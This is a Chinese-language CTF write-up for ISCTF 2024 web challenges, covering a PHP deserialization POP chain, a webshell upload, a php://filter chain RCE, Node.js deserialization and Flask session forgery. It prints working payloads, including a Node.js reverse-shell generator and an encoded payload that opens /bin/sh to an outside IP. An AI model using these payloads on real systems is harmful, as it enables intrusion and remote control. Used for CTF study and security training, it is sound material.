---
title: isctf
date: 2024-11-15 20:10:57
tags: 复现
categories: 比赛复现
---

## isctf

## 天命人

```php
<?php
error_reporting(0);

# 帮天命人搜集法宝，重获齐天之姿！
class Wuzhishan{
    public $wu="俺老孙定要踏破这五指山！<br>";
    public $zhi;
    public $shan;

    function __get($j)
    {
        echo "此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！<br>";
        $yin="s214587387a";
        $yang=$_GET['J'];
        if (md5($yin)==$yang&&md5($yin)==md5($yang)){
            echo "哦？又一个不信天命之人？行了，拿了东西速速离开吧<br>";
            system('cat /flag');
        }
    }
}
class Huoyanjinjing{
    public $huoyan;
    public $jinjing;
    function __get($huo)
    {
        $this->huoyan="火眼能洞察一切邪祟！<br>";
        echo $this->huoyan->jinjing;
    }
    function __invoke()
    {
        $this->jinjing="金睛能看破世间迷惘！<br>";
        echo $this->huoyan->jinjing;
    }
}
class Dinghaishenzhen{
    public $Jindou="一个筋斗能翻十万八千里！<br>";
    public $yun;

    function __toString()
    {
        $f=$this->yun;
        $f();
        return "你真的逃出去了吗？天命人？<br>";
    }
}
class Jingdouyun{
    public $Qishier=72;
    public $bian="看俺老孙七十二变！<br>";

    function __sleep()
    {
        echo "三更敲门，菩提老祖送我筋斗云...<br>";
        echo new Jindouyun();
    }
}
class Tianmingren {
    public $tianming;
    public $ren;
    function __destruct()
    {
        echo "迷途中的羔羊，你相信天命吗？<br>";
        echo $this->tianming;
    }
}
$data = unserialize($_POST['Wukong']);
throw new Exception('开局一根棍，装备全靠打。');
?>
```

我们先不看最后一行代码，剩下的就是简单的反序列化

那怎么触发分析

1. 创建 Tianmingren 对象触发 __destruct() 魔术方法

2. 将tianming 赋值为 Dinghaishenzhen 对象触发 __toString() 魔术方法
3. 将属性 yun 赋值为Huoyanjinjing 对象，对象被当成函数调用触发 __invoke() 魔术方法
4. 将属性 huoyan 赋值为 Wuzhishan 对象，访问对象不存在的属性 jinjing 触发 __get() 魔术方法

简单来说就是

```
Tianmingren()->Dinghaishenzhen()->Huoyanjinjing()->Wuzhishan()
```



但当我们考虑最后一行代码

```
throw new Exception('开局一根棍，装备全靠打。');
```

这是个异常抛出，也就是php的的垃圾回收机制

### PHP中的GC

在PHP中，使用`引用计数`和`回收周期`来自动管理内存对象的，当一个变量被设置为`NULL`，或者没有任何指针指向
时，它就会被变成垃圾，被`GC`机制自动回收掉

那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被`GC`机制回收，在回收的过程中，它会自动触发`_destruct`方法，而这也就是我们绕过抛出异常的关键点。

**绕过方法：序列化数组，并将第二个索引的值赋值为0**

也就是第二个i的值为0

```python
a:2:{i:0;O:1:"B":0:{}i:0;i:0;}
```



回到题目，我们序列化一个数组，并将它的第二个值赋值为0

```
$a=new Tianmingren();
$a->tianming=new Dinghaishenzhen();
$a->tianming->yun=new Huoyanjinjing();
$a->tianming->yun->huoyan=new Wuzhishan();
echo (serialize(array($a,$a)));
```



### exp

```php
<?php
error_reporting(0);

# 帮天命人搜集法宝，重获齐天之姿！
class Wuzhishan{
    public $wu="俺老孙定要踏破这五指山！<br>";
    public $zhi;
    public $shan;

    function __get($j)
    {
        echo "此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！<br>";
        $yin="s214587387a";
        $yang=$_GET['J'];
        if (md5($yin)==$yang&&md5($yin)==md5($yang)){
            echo "哦？又一个不信天命之人？行了，拿了东西速速离开吧<br>";
            system('cat /flag');
        }
    }
}
class Huoyanjinjing{
    public $huoyan;
    public $jinjing;
    function __construct()
    {
        $this->huoyan=new Wuzhishan();

    }
    function __get($huo)
    {

        echo "火眼能洞察一切邪祟！<br>";
        echo $this->huoyan->jinjing;
    }

}
class Dinghaishenzhen{
    public $Jindou="一个筋斗能翻十万八千里！<br>";
    public $yun;


}
class Jingdouyun{
    public $Qishier=72;
    public $bian="看俺老孙七十二变！<br>";

}
class Tianmingren {
    public $tianming;
    public $ren;


}

$a=new Tianmingren();
$a->tianming=new Dinghaishenzhen();
$a->tianming->yun=new Huoyanjinjing();
$a->tianming->yun->huoyan=new Wuzhishan();
echo (serialize(array($a,$a)));

```

pop链构造完了之后就是传参

```
function __get($j)
    {
        echo "此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！<br>";
        $yin="s214587387a";
        $yang=$_GET['J'];
        if (md5($yin)==$yang&&md5($yin)==md5($yang)){
            echo "哦？又一个不信天命之人？行了，拿了东西速速离开吧<br>";
            system('cat /flag');
        }
    }
```

我们要传一个j使它等于md5($yin)的值，并且使j的md5等于yin的md5

也就是说，我们需要j为一个0e开头的数，j的md5也为一个0e开头的数

我们想到

```
0e215962017的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等
```

所以j传0e215962017

![image-20241117193816468](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411171938564.png)

## 小蓝鲨的秘密

我们打开链接。直接跳转到官网去了，我们能直接打官网？？？

那中间肯定经过了一个什么然后才跳转的

我们直接抓包题目链接

得到flag

![image-20241117194604910](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411171946012.png)

## 小蓝鲨的临时存储室

我们先上传一个一句话木马

```
<?php eval($_POST[1]); ?>
```

居然成功了，我们用蚁剑进行连接

在根目录直接读取flag，果然失败了

![image-20241117195525706](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411171955759.png)

过了一会，我们发现文件都不能操作了，网页显示我们上传的一句话木马无法找到，猜测有定时任务将文件删除了

![image-20241117195612357](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411171956389.png)

我们重新上传一句话木马，在根目录找个这个文件，可以将 uplods 目录下所有 php 后缀的文件删除

![image-20241117195851254](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411171958293.png)

down_file.sh可以写入，那我们可以写入一条chmod 777 /flag给flag文件一个可读权限

![img](https://xzfile.aliyuncs.com/media/upload/picture/20241112123931-1c3194cc-a0b0-1.png)

只需等待定时任务触发，就可以读取flag了

## 千年樱

```php
<?php
include "dir.php";
highlight_file(__FILE__);

echo "proof of work<br>";

if($_COOKIE['from'] === "ISCTF"){
    echo $dir1;
}
else{
    die('what? so where are you from?');
}

// <!-- do you want to learn more?  goto story.txt -->
?>
```

第一关需要我们在cookie中修改from为ISCTF

改完刷新页面，得到第二关的文件

![image-20241117204353460](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411172043538.png)

```php
<!DOCTYPE html>
<html>
<head>
    <title>read! read! read!</title>
</head>
<body style="background: '/static/bg1.png' ">
    <?php
    include "dir.php";
    highlight_file(__FILE__);

    if(file_get_contents($_POST['name']) === 'ISCTF'){
        echo $dir2;
    }
    else{
        die("Wrong!");
    }


    ?>
```

第二关需要我们用伪协议读取文件

```
name=data://text/plain,ISCTF
```

得到第三关的链接

```
/well_down_mlpnkobji.php
```

```
 <?php
    include "dir.php";
    highlight_file(__FILE__);

    function waf($str){
        if(preg_match("/http|php|file|:|=|\/|\?/i", $str) ){
            die('bad hacker!!!');
        }
    }
    $poc = $_POST['poc'];
    waf($poc);
    $filename = "php://filter/$poc/resource=/var/www/html/badChar.txt";
    $result = file_get_contents($filename);
    if($result === "sakura for ISCTF"){
        echo "yes! master!";
        eval($_POST['cmd']);
    }

    if($_GET['output'] == 114514 && !is_numeric($_GET['output'])){
        var_dump($result);
    }


    ?>
```

第二个if **114514 后面加 a 绕过**

重点第一个if

2024XYCTF 有道类似的题，连连看到底是连连什么看

https://blog.csdn.net/uuzeray/article/details/138274291

使用工具 php_filter_chain 进行伪造

```
python php_filter_chain_generator.py --chain "sakura for ISCTF<?php"
```

![image-20241117204836136](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411172048212.png)

直接打的话ISCTF后会有脏数据

手动加string.strip_tags过滤器来去除php标签

最终payload

```
convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode&cmd=system("cat flag.php");
```



![image-20241118192113581](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411181921693.png)

~~如果出现报错，把convert.iconv.UTF8.CSISO2022KR删了~~

看了wp，发现payload前面还要加上base64-encode，不然会报错

```
convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags
```

得到flag

![image-20241118192146840](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411181921908.png)



## ezlogin（nodejs反序列化）

我们app.js里发现关键源码，如下：

```php
function auth(req, res, next) {
  if(req.cookies.token){
    const user = serialize.unserialize(Buffer.from(req.cookies.token,'base64').toString());
    if (!user.username) {
        return res.status(401).redirect('/login');
    }
  }else{
    return res.status(401).redirect('/login');
  }
  next();
}
```

这里存在一个unserialize函数，我们不难想到Node.js反序列化

归还于这个漏洞，我们搜到一个 cve，文章如下：

```cobol
https://cloud.tencent.com/developer/article/1374840
```

照着文章直接打就行

使用 nodejsshell.py 生成反弹 shell 的 payload

nodejsshell.py 如下：

```
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys
 
if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)
 
IP_ADDR = sys.argv[1]
PORT = sys.argv[2]
 
 
def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]
 
print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print "[+] Encoding"
PAYLOAD = charencode(NODEJS_REV_SHELL)
print "eval(String.fromCharCode(%s))" % (PAYLOAD)
```

我们需要用到python2运行

```
python2 Nodejs.py 156.238.233.78 2233
```

![image-20241118195013751](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411181950889.png)

得到反弹 shell 的 payload，接着生成反序列化的 payload：

```
{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,54,48,46,50,48,52,46,49,53,56,46,56,55,34,59,10,80,79,82,84,61,34,50,50,50,50,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

先登陆下，生成一个 cookie，登陆成功后抓包就有了 cookie 字段，将 payload base64 编码后传入 cookie 字段，攻击机开启监听

![image-20241118195846018](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411181958085.png)

![image-20241118195858142](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411181958194.png)



## 小蓝鲨的故事

我们扫描目录，发现了

![img](https://img-blog.csdnimg.cn/img_convert/5f7114a6b5e34449af4171da497afeb4.png)

题目提示了robots.txt里的是key，我们访问flag，访问失败

![image-20241118201019596](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411182010647.png)

我们猜测这里需要session伪造

我们解session看看

![image-20241118201107455](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411182011537.png)

用户名是www-data，我们更改为admin，还是进不去flag

我们返回最开始的页面，它说让我们 Read Hacker!!!，我们访问Hacker看看

![image-20241118201320697](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411182013775.png)

emm，得到了用户名ISctf_Hacker

![image-20241118201335870](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411182013936.png)

我们用ISctf_Hacker进行伪造session

```
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3:  # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else:  # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else:  # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e

if __name__ == "__main__":
    # Args are only relevant for __main__ usage

    ## Description for help
    parser = argparse.ArgumentParser(
        description='Flask Session Cookie Decoder/Encoder',
        epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                               help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                               help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                               help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                               help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if (args.subcommand == 'encode'):
        if (args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif (args.subcommand == 'decode'):
        if (args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value, args.secret_key))
        elif (args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))
```

```
 python session_encode.py  encode -t "{'username': b'ISctf_Hacker'}" -s "fS5AdODy"
 
 //eyJ1c2VybmFtZSI6eyIgYiI6IlNWTmpkR1pmU0dGamEyVnkifX0.Zzswag.iMDf132OIDiHH1WpTX1o9_RYyPE
```

修改session，然后访问flag，得到flag

